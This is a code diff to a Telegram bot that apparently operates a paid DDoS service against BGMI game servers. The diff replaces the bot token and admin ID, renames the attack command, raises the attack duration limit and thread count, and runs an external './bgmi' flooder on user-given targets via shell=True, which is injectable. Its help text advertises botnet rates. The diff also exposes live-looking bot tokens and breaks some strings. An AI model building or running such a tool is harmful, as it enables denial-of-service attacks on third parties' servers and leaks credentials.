@@ -7,10 +7,10 @@ import datetime
 import os
 
 # insert your Telegram bot token here
-bot = telebot.TeleBot('7091647219:AAFJUxMh01uhUNrPqXxDh9XN_1g7SowWX_Y')
+bot = telebot.TeleBot('7415554127:AAEldDAII3jdg6T6pccPd5JhuKe7z42MZ2M')
 
 # Admin user IDs
-admin_id = ["", "", "", "721886203"]
+admin_id = ["5508427627"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -215,8 +215,9 @@ bgmi_cooldown = {}
 
 COOLDOWN_TIME =0
 
-# Handler for /bgmi command
-@bot.message_handler(commands=['bgmi'])
+
+# Handler for /Ak command
+@bot.message_handler(commands=['Ak'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
@@ -235,17 +236,17 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
-            if time > 121:
-                response = "Error: Time interval must be less than 80."
+            if time > 10001:
+                response = "Error: Time interval must be less than 599"
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 200"
+                full_command = f"./bgmi {target} {port} {time} 500"
                 subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
+                response = "BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
-            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
+            response = "✅ u/sage :-/ Ak <target> <port> <time>"  # Updated command syntax
     else:
         response = "❌ You Are Not Authorized To Use This Command ❌."
 
@@ -277,7 +278,7 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text ='''🤖 Available commands:
-💥 /bgmi : Method For Bgmi Servers. 
+💥 /Ak : Method For Bgmi Servers. 
 💥 /rules : Please Check Before Use !!.
 💥 /mylogs : To Check Your Recents Attacks.
 💥 /plan : Checkout Our Botnet Rates.
@@ -366,6 +367,7 @@ def broadcast_message(message):
         else:
             response = "🤖 Please Provide A Message To Broadcast."
     else:
+
         response = "Only Admin Can Run This Command 😡."
 
     bot.reply_to(message, response)
